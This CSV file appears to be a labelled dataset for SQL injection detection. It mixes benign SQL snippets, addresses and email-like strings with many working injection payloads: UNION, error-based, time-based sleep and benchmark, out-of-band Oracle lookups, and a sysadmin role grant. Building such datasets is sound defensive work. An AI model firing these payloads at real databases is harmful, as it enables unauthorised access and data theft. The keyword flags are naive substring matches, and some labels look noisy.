Query,SELECT,UNION,OR,AND,Label
"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,1,0,1
294r1152ar,0,0,0,0,0
SELECT AVG ( Price ) FROM sail,1,0,0,0,0
"1"" where 2878  =  2878 union all select null,null,null,null,null#",1,1,0,0,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte",1,0,0,1,1
" SELECT LOCATE ( ""a"", CustomerName )  FROM Customers;",1,0,0,0,0
"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,0,1,1
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,0,1,1,1
3.62194E+15,0,0,0,0,0
"  UPDATE steady SET palace =  'exercise', City =  'trick' WHERE cast =  probably",0,0,0,0,0
"   SELECT COUNT ( fish ) , death FROM natural BY grown",1,0,0,0,0
SELECT behind ( s )  FROM last SELECT dawn ( s ) ,1,0,0,0,0
"hospitalet de llobregat, l'",0,0,0,0,0
alfredo calderon 136,0,0,0,0,0
90660924f,0,0,0,0,0
"1'   )    )    as hmyc where 6732  =  6732 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,0,0,1,1
SELECT * FROM post FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
SELECT * FROM join,1,0,0,0,0
"1""  )   where 6956  =  6956 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,1,0,1
SELECT loss ( s )  FROM sale UNION ALL,1,1,0,0,0
"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,0,1,1
SELECT Count ( * )  AS women,1,0,0,0,0
elido,0,0,0,0,0
*|,0,0,0,0,1
"umbria, 143,",0,0,0,0,0
SELECT * FROM Customers  WHERE Country = 'Germany' AND  ( City = 'Berlin' OR City = 'München' ) ;,1,0,1,1,0
"  UPDATE hurried SET definition =  'lungs', City =  'statement' WHERE tea =  problem",0,0,0,0,0
SELECT about FROM tell UNION ALL SELECT nose FROM bad ORDER BY safety,1,1,1,0,0
 or 1 --',0,0,1,0,1
"1""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,1,0,1
"pl. ingeniero torres quevedo, s/n 7?a",0,0,1,0,0
"  UPDATE which SET gas =  'court', City =  'its' WHERE dropped =  can",0,0,0,0,0
"   SELECT Employees.type, COUNT ( Orders.locationID )  AS comeFROM    ( OrdersINNER JOIN running ON Orders.talesID  =  Employees.herdID ) ",1,0,1,0,0
"iif  (  8770  =  9611,1,1/0  )  ",0,0,0,0,1
SELECT private ( s )  FROM wing LEFT JOIN,1,0,0,0,0
SELECT AVG ( constantly ) FROM nation SELECT SUM ( forget ) ,1,0,1,0,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,0,0,1,1
SELECT * FROM mostly,1,0,0,0,0
"select * from generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   limit 1--",1,0,0,0,1
SELECT * FROM protection WHERE gold = 'involved'  AND City = 'poem',1,0,0,1,0
"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,0,1,1
 UPDATE everybody SET wise = 'rapidly'WHERE discover = 'pattern',0,0,0,0,0
es3an7oso,0,0,0,0,0
select case when 9390  =  5752 then 1 else null end--,1,0,0,0,1
"-6870""  )   as deox where 8198  =  8198 union all select 8198#",1,1,0,0,1
SELECT * FROM fellow FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,1,1,0,1
6.50345E+15,0,0,0,0,0
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0,1,1,1
fortet esquer,0,0,1,0,0
SELECT * FROM stopped WHERE rear = 'writing' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
-4219' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,0,1,0,1
83677248m,0,0,0,0,0
artica,0,0,0,0,0
"1   )    )    union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,1
59718568b,0,0,0,0,0
SELECT height FROM chart UNION ALL SELECT parallel FROM principle ORDER BY tax,1,1,1,0,0
laurencia,0,0,0,0,0
SELECT AVG ( toward ) FROM bow,1,0,0,0,0
2.4571E+15,0,0,0,0,0
SELECT * FROM receive FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
3.81793E+14,0,0,0,0,0
"-9096""  )   where 9452  =  9452 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,0,1,0,1
" SELECT column_name ( s )  FROM greatly,compare",1,0,0,0,0
union select * from users where login   =   char ...,1,1,0,0,1
prell@davidymamen.tc,0,0,0,0,0
SELECT trace ( s )  FROM firm UNION,1,1,0,0,0
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,0,0,0,1,1
SELECT * FROM farm WHERE herself  BETWEEN 10 AND 20,1,0,0,1,0
ocallaghan@asyra.li,0,0,0,0,0
SELECT AVG ( rain ) FROM slipped,1,0,0,0,0
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'pcim'  =  'pcim",1,0,0,1,1
"avda. juan carlos i, 195, 6f",0,0,0,0,0
SELECT COUNT ( son ) FROM remarkable,1,0,0,0,0
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg",1,0,1,1,1
"  SELECT pleaseID AS ID, wherever AS uncle FROM boat",1,0,0,0,0
SELECT * FROM short WHERE by BETWEEN '1996-07-01' AND '1996-07-31',1,0,1,1,0
-3431%'  )   or 9323  =  9323#,0,0,1,0,1
"SELECT * FROM few WHERE carry BETWEEN ""circle"" AND    ""him""",1,0,0,1,0
"1"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,1,1
14970,0,0,0,0,0
SELECT * FROM forth WHERE physical NOT BETWEEN 'jump' AND 'each',1,0,1,1,0
"1%""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,1,0,1,1,1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",0,0,1,1,1
schweiger_blanc@restaurantepicopico.rw,0,0,0,0,0
"  SELECT cat,pour,bark FROM father LEFT JOIN Orders ON changing.becauseID =  fast.steep ORDER BY child.label",1,0,1,0,0
a8o8decer,0,0,0,0,0
valdearcos de la vega,0,0,0,0,0
"-5187""  )   union all select 3373,3373#",1,1,0,0,1
SELECT valuable ( s )  FROM package UNION,1,1,0,0,0
nicholls@devuelos.vu,0,0,0,0,0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
SELECT MIN ( planning )  AS wear FROM space,1,0,0,0,0
"   SELECT COUNT ( making ) , swimming FROM breakfast BY storm",1,0,1,0,0
99020664y,0,0,0,0,0
SELECT AVG ( refused ) FROM check,1,0,0,0,0
SELECT * FROM  ( SELECT garden FROM fair ) ,1,0,0,0,0
aborr-ascarse,0,0,1,0,0
"passatge badal, 31,",0,0,0,0,0
1'  )   as yqld where 2489  =  2489,0,0,0,0,1
SELECT poetry ( s )  FROM cream SELECT heart FROM creature,1,0,0,0,0
1oca,0,0,0,0,0
"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""fogb"" like ""fogb",1,0,0,1,1
"1"" where 1234  =  1234",0,0,0,0,1
1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,0,0,1,1,1
"-5630""  )   or 3038  =  3038",0,0,1,0,1
"INSERT INTO automobile  ( soldier, best, clean )  VALUES  ( 'struck', 'program', 'greatly' )  ",0,0,0,0,0
SELECT * FROM food,1,0,0,0,0
SELECT zero,1,0,0,0,0
"-2071 union all select 4753,4753--",1,1,0,0,1
matney,0,0,0,0,0
5425,0,0,0,0,0
"1%""  )   and 8715  =  5529",0,0,0,1,1
"  SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.contrastID ORDER BY Orders.shallID",1,0,1,0,0
SELECT TOP 3 * FROM writer SELECT * FROM truth 3SELECT * FROM court,1,0,0,0,0
SELECT AVG ( environment ) FROM pole SELECT SUM ( list ) ,1,0,0,0,0
av. carlos marx s/n,0,0,0,0,0
com/is?-WZx-uhyLezKNiYLvAbKL3W4oh5F749nr2KUmFFjZOU  <email_address>  <![CDATA[elwoodbuckley@freenet,0,0,0,0,0
"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",0,0,1,0,1
SELECT COUNT ( secret ) FROM beside,1,0,0,0,0
"  SELECT three AS halfway, pipe AS [burn]  FROM fallen",1,0,0,0,0
DELETE FROM bow,0,0,0,0,0
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",0,0,0,1,1
16610,0,0,0,0,0
"1""  )   as frmp where 6073  =  6073",0,0,0,0,1
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,1,0,0,1
SELECT AVG ( habit ) FROM ago SELECT SUM ( manner ) ,1,0,0,0,0
SELECT national ( s ) FROM dug INNER JOIN,1,0,0,0,0
SELECT Count ( * )  AS season,1,0,0,0,0
areces casallac,0,0,0,0,0
"1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1,0,0,1,1
SELECT society ( s )  FROM flight UNION ALL,1,1,0,0,0
SELECT * FROM valuable ORDER BY yellow DESC,1,0,1,0,0
SELECT * FROM Customers  ORDER BY Country DESC;,1,0,1,0,0
SELECT printed ( s )  FROM verb FULL OUTER JOIN,1,0,0,0,0
lima9za,0,0,0,0,0
SELECT COUNT ( whenever ) FROM sell,1,0,0,0,0
1'  )   where 1502  =  1502 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,0,0,1,1
"c/ juan rabadan 27, 6?a",0,0,0,0,0
chimeneas,0,0,0,0,0
adgardo,0,0,0,0,0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo",1,0,0,1,1
"fundidores, 179,",0,0,1,0,0
combos,0,0,0,0,0
-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,1,0,1,1,1
-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,1,0,1,1,1
"  SELECT gentlyID AS ID, tea AS hill FROM answer",1,0,0,0,0
-1908'   )    )     )   union all select 7665#,1,1,0,0,1
corsini-vischer@viajesdacapalla.nl,0,0,1,0,0
denno,0,0,0,0,0
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,0,1,0,1
1'  )   where 4949  =  4949,0,0,0,0,1
1'  )   as chla where 6098  =  6098,0,0,0,0,1
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,1,0,0,1,1
SELECT *FROM  ( SELECTcolumn_name ( s )  FROM,1,0,0,0,0
"-1269' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'gohv' like 'gohv",1,0,1,1,1
1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,0,0,0,1,1
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,0,0,1,1,1
SELECT * FROM interest WHERE earth = 'mail'  OR aloud = 'beyond',1,0,1,0,0
"1%""   )    )    and 9198  =  9198--",0,0,0,1,1
tewksbur,0,0,0,0,0
SELECT * FROM attack WHERE unless = 'task' LIMIT 3,1,0,0,0,0
"exec sp_addsrvrolemember 'name' , 'sysadmin'",0,0,0,0,1
"INSERT INTO prize  ( vapor, indeed, also )  VALUES  ( 'law', 'break', 'lesson' )  ",0,0,1,0,0
1'||  (  select 'pyga' from dual where 8501  =  8501 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,0,1,0,1
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1,0,0,1,1
1.94E+15,0,0,0,0,0
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,0,1,0,1
"  SELECT lot AS term, gulf AS [tax]  FROM upon",1,0,0,0,0
calle bertran de castellet 28 6e,0,0,0,0,0
SELECT AVG ( bet ) FROM location,1,0,0,0,0
-3084%'   )    )    order by 1--,0,0,1,0,1
"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",0,0,0,1,1
SELECT * FROM office FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feel,1,0,0,0,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28549 )  ORDER BY meta_id ASC",1,0,1,0,0
SELECT * FROM low WHERE eleven = 'properly'  AND City = 'ice',1,0,0,1,0
SELECT change ( s )  FROM chicken UNION ALL,1,1,0,0,0
"-5026' where 7324  =  7324 union all select 7324,7324--",1,1,0,0,1
ezcurra lo cascio,0,0,0,0,0
"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1,1,0,0,1
1   )    )    as pjkd where 1105  =  1105 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,0,0,1,1
"pl. cantarranillas 21,",0,0,0,0,0
eberto,0,0,0,0,0
"1""   )    )    as ndbk where 5042  =  5042 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,0,0,1,1
SELECT AVG ( imagine ) FROM directly,1,0,0,0,0
"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0,1,1,1
pg_sleep  (  __TIME__  )  --,0,0,0,0,1
trooger_gereighty@quierocortinas.mil,0,0,1,0,0
"-2375 union all select 1573,1573,1573,1573#",1,1,0,0,1
1'+  (  select 'uetb' where 6468  =  6468,1,0,0,0,1
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'bvdw'  =  'bvdw",1,0,1,1,1
8.93682E+15,0,0,0,0,0
SELECT * FROM related WHERE along LIKE '%income%',1,0,0,0,0
"1'+  (  select 'yzxc' where 5230  =  5230   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1,0,0,0,1
1'+  (  select 'kicv' where 1976  =  1976 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1,0,0,1,1
calzada rebassa,0,0,0,0,0
kjell,0,0,0,0,0
"1"" where 2204  =  2204 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,0,1,1
SELECT needle ( s )  FROM catch,1,0,0,0,0
7.54804E+15,0,0,0,0,0
"1  )   where 2473  =  2473 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,0,0,1,1
"1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,1,0,1
"calle pea 49, 9?b",0,0,0,0,0
-9145'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'yvfl' like 'yvfl,1,0,1,1,1
SELECT TOP 3 * FROM traffic SELECT * FROM rock 3SELECT * FROM grew,1,0,0,0,0
"1'  )   where 8628  =  8628 union all select null,null,null--",1,1,0,0,1
SELECT * FROM older WHERE NOT regular = 'lead'  AND NOT clearly = 'straw',1,0,0,1,0
"1"" union all select null,null,null,null,null,null,null--",1,1,0,0,1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,1,0,0,1,1
1'  )   where 7541  =  7541,0,0,0,0,1
1emat98,0,0,0,0,0
SELECT familiar,1,0,0,0,0
cesana@lasexta-f1.jm,0,0,0,0,0
1 where 8398  =  8398,0,0,0,0,1
SELECT * FROM  ( SELECT weak FROM breakfast ) ,1,0,0,0,0
"1%'  )   union all select null,null,null,null,null,null--",1,1,0,0,1
1' and sleep  (  5  )   and 'pfgy'  =  'pfgy,0,0,0,1,1
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""rvuz"" like ""rvuz",1,0,0,1,1
pifiar,0,0,0,0,0
plang_schallert@white-pearl-resort.kp,0,0,1,0,0
SELECT AVG ( game ) FROM stage SELECT SUM ( subject ) ,1,0,0,0,0
SELECT * FROM pool FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
1i515s7d7d,0,0,0,0,0
1  )   as qwsa where 2874  =  2874,0,0,0,0,1
1   )    )    as svhd where 9761  =  9761,0,0,0,0,1
"azorin, 167",0,0,1,0,0
SELECT * FROM east  WHERE applied NOT LIKE '[policeman]%',1,0,0,0,0
"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",0,0,1,1,1
"1'  )   as myxr where 6299  =  6299 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,0,1,1
zoq3et1r8,0,0,0,0,0
SELECT * FROM task WHERE meal = 'kill'  OR southern = 'enjoy',1,0,1,0,0
